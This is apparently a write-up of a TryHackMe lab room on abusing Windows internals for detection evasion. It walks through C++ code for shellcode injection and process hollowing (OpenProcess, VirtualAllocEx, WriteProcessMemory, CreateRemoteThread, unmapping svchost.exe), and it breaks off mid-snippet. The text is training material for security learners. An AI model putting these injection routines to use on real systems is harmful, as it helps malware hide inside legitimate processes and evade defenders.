---
Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches.
---

# Abusing Windows Internals — Writeup

## Overview
### Abusing Windows Internals — Writeup
### Abusing Windows Internals — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8102e8da7d93e68ba15886b5b0e67a4a.png)
### Introduction
Windows internals are core to how the Windows operating system functions; this provides adversaries with a lucrative target for nefarious use. Windows internals can be used to hide and execute code, evade detections, and chain with other techniques or exploits.
The term Windows internals can encapsulate any component found on the back-end of the Windows operating system. This can include processes, file formats, COM (Component Object Model), task scheduling, I/O System, etc. This room will focus on abusing and exploiting processes and their components, DLLs (Dynamic Link Libraries), and the PE (Portable Executable) format.
Learning Objectives
Understand how internal components are vulnerable
Learn how to abuse and exploit Windows Internals vulnerabilities
Understand mitigations and detections for the techniques
Apply techniques learned to a real-world adversary case study
Before beginning this room, familiarize yourself with basic Windows usage and functionality. We recommend completing the Windows Internals room. Basic programming knowledge in C++ and PowerShell is also recommended but not required.
We have provided a base Windows machine with the files needed to complete this room. You can access the machine in-browser or through RDP using the credentials below.
Machine IP: 10.10.195.190             Username: THM-Attacker             Password: Tryhackme!
This is going to be a lot of information. Please buckle your seatbelts and locate your nearest fire extinguisher.
Don’t forget to tip your blue team on the way out!
### Abusing Processes
Applications running on your operating system can contain one or more processes. Processes maintain and represent a program that’s being executed.
Processes have a lot of other sub-components and directly interact with memory or virtual memory, making them a perfect candidate to target. The table below describes each critical component of processes and their purpose.
Process Component	Purpose
Private Virtual Address Space
Virtual memory addresses the process is allocated.
Executable Program
Defines code and data stored in the virtual address space
Open Handles
Defines handles to system resources accessible to the process
Security Context
The access token defines the user, security groups, privileges, and other security information.
Process ID
Unique numerical identifier of the process
Threads
Section of a process scheduled for execution
For more information about processes, check out the Windows Internals room.
Process injection is commonly used as an overarching term to describe injecting malicious code into a process through legitimate functionality or components. We will focus on four different types of process injection in this room, outlined below.
Injection Type	Function
Process Hollowing https://attack.mitre.org/techniques/T1055/012/
Inject code into a suspended and “hollowed” target process
Thread Execution Hijacking https://attack.mitre.org/techniques/T1055/003/
Inject code into a suspended target thread
Dynamic-link Library Injection https://attack.mitre.org/techniques/T1055/001/
Inject a DLL into process memory
Portable Executable Injection https://attack.mitre.org/techniques/T1055/002/
Self-inject a PE image pointing to a malicious function into a target process
There are many other forms of process injection outlined by [MITRE T1055](https://attack.mitre.org/techniques/T1055/).
At its most basic level, process injection takes the form of shellcode injection.
At a high level, shellcode injection can be broken up into four steps:
Open a target process with all access rights.
Allocate target process memory for the shellcode.
Write shellcode to allocated memory in the target process.
Execute the shellcode using a remote thread.
The steps can also be broken down graphically to depict how Windows API calls interact with process memory.
We will break down a basic shellcode injector to identify each of the steps and explain in more depth below.
At step one of shellcode injection, we need to open a target process using special parameters. OpenProcess is used to open the target process supplied via the command-line.
```text
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```
At step two, we must allocate memory to the byte size of the shellcode. Memory allocation is handled using VirtualAllocEx. Within the call, the dwSize parameter is defined using the sizeof function to get the bytes of shellcode to allocate.
```text
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```
At step three, we can now use the allocated memory region to write our shellcode. WriteProcessMemory is commonly used to write to memory regions.
```text
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```
At step four, we now have control of the process, and our malicious code is now written to memory. To execute the shellcode residing in memory, we can use CreateRemoteThread; threads control the execution of processes.
```text
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```
We can compile these steps together to create a basic process injector. Use the C++ injector provided and experiment with process injection.
Shellcode injection is the most basic form of process injection; in the next task, we will look at how we can modify and adapt these steps for process hollowing.
Identify a PID of a process running as THM-Attacker to target. Once identified supply the PID as an argument to execute shellcode-injector.exe located in the Injectors directory on the desktop.
*No answer needed*
![[Pasted image 20220912165905.png]]
What flag is obtained after injecting the shellcode?
### Expanding Process Abuse
In the previous task, we discussed how we can use shellcode injection to inject malicious code into a legitimate process. In this task we will cover process hollowing. Similar to shellcode injection, this technique offers the ability to inject an entire malicious file into a process. This is accomplished by “hollowing” or un-mapping the process and injecting specific PE (Portable Executable) data and sections into the process.
At a high-level process hollowing can be broken up into six steps:
Create a target process in a suspended state.
Open a malicious image.
Un-map legitimate code from process memory.
Allocate memory locations for malicious code and write each section into the address space.
Set an entry point for the malicious code.
Take the target process out of a suspended state.
The steps can also be broken down graphically to depict how Windows API calls interact with process memory.
We will break down a basic process hollowing injector to identify each of the steps and explain in more depth below.
At step one of process hollowing, we must create a target process in a suspended state using CreateProcessA. To obtain the required parameters for the API call we can use the structures STARTUPINFOA and PROCESS_INFORMATION.
```text
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```
In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using CreateFileA to obtain a handle for the malicious image.
```text
HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);
```
Once a handle for the malicious image is obtained, memory must be allocated to the local process using VirtualAlloc. GetFileSize is also used to retrieve the size of the malicious image for dwSize.
```text
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
```
Now that memory is allocated to the local process, it must be written. Using the information obtained from previous steps, we can use ReadFile to write to local process memory.
```text
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
```
At step three, the process must be “hollowed” by un-mapping memory. Before un-mapping can occur, we must identify the parameters of the API call. We need to identify the location of the process in memory and the entry point. The CPU registers EAX (entry point), and EBX (PEB location) contain the information we need to obtain; these can be found by using GetThreadContext. Once both registers are found, ReadProcessMemory is used to obtain the base address from the EBX with an offset (0x8), obtained from examining the PEB.
```text
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&pTargetImageBaseAddress, // Store target base address 
	sizeof(PVOID), // Bytes to read 
	0 // Number of bytes out
);
```
After the base address is stored, we can begin un-mapping memory. We can use ZwUnmapViewOfSection imported from ntdll.dll to free memory from the target process.

## Enumeration
```text
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
